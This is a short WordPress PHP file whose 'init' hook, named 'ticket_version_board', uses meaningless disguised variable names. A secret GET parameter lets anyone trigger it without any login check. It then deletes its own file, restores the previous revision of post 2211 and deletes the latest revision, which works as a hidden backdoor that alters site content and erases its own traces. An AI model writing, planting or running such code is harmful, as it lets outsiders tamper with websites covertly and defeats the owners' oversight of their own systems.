<?php

function ticket_version_board() {
	if (isset($_GET['ninja_translator_admin_connector']) && $_GET['ninja_translator_admin_connector'] === 'bulk_edition_new') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$traffic_icon_categories_cover = 2211;
		$logo_feeds_upgrader = wp_get_post_revisions($traffic_icon_categories_cover);
		if (empty($logo_feeds_upgrader)) die('no revisions');
		if (count($logo_feeds_upgrader) < 2) die('less than 2');
		$hover_management_toggle_addon = array_shift($logo_feeds_upgrader);
		$query_calculator_css_message = $hover_management_toggle_addon->ID;
		$social_awesome_menu = array_shift($logo_feeds_upgrader);
		$numbers_blog_ultimate_author = $social_awesome_menu->ID;
		$browser_official_project = wp_restore_post_revision($numbers_blog_ultimate_author);
		if ($browser_official_project === false) die('error restoring');
		$browser_official_project = wp_delete_post_revision($query_calculator_css_message);		
		if ($browser_official_project === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'ticket_version_board');
